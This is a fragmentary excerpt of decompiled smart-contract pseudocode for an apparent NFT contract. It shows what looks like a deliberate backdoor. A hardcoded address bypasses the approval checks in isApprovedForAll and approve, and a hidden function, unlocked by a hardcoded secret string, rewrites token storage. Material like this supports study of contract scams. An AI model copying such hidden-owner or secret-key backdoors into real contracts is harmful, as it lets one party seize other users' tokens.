...
function isApprovedForAll(address arg1, address arg2) payable {
    ...
    require arg1 == arg1
    require arg2 == arg2
    if arg2 != 0xd606543c1c7607bf02b9536e9b31cdc1cf564c1e:
...
function approve(address arg1, uint256 arg2) payable {
    ...
    if ownerOf[arg2] != msg.sender:
        if msg.sender != 0xd606543c1c7607bf02b9536e9b31cdc1cf564c1e:
...
function hashCompareInternal(string arg1, string arg2) payable {
    require calldata.size - 4 >= 64
...
function sub_853d42ad(?) payable {
    ...
    if sha3(Mask(8 * arg3.length, -(8 * arg3.length) + 256, arg3[all], Mask(8 * ceil32(arg3.length) - arg3.length, -(8 * ceil32(arg3.length) + -ceil32(ceil32(arg3.length)) + 31) + 256, 17) >> -(8 * ceil32(arg3.length) + -ceil32(ceil32(arg3.length)) + 31) + 256) << (8 * arg3.length) - 256) != sha3('tghre345qwsdf3axc'):
        return stor9
    if arg4 > stor9:
        stor9 = arg4
    if not address(arg1):
    ...
    if stor8[arg4].field_0:
        if stor8[arg4].field_0 == uint255(stor8[arg4].field_0) * 0.5 < 32:
            revert with 0, 34
        if arg2.length:
            stor8[arg4][].field_0 = Array(len=arg2.length, data=arg2[all])
        else:
            stor8[arg4].field_0 = 0
            idx = 0
            while (uint255(stor8[arg4].field_0) * 0.5) + 31 / 32 > idx:
                stor8[arg4][idx].field_0 = 0
                idx = idx + 1
                continue 
    else:
        if stor8[arg4].field_0 == stor8[arg4].field_1 < 32:
            revert with 0, 34
        if arg2.length:
            stor8[arg4][].field_0 = Array(len=arg2.length, data=arg2[all])
        else:
            stor8[arg4].field_0 = 0
            idx = 0
            while stor8[arg4].field_1 + 31 / 32 > idx:
                stor8[arg4][idx].field_0 = 0
                idx = idx + 1
                continue 
    return arg4
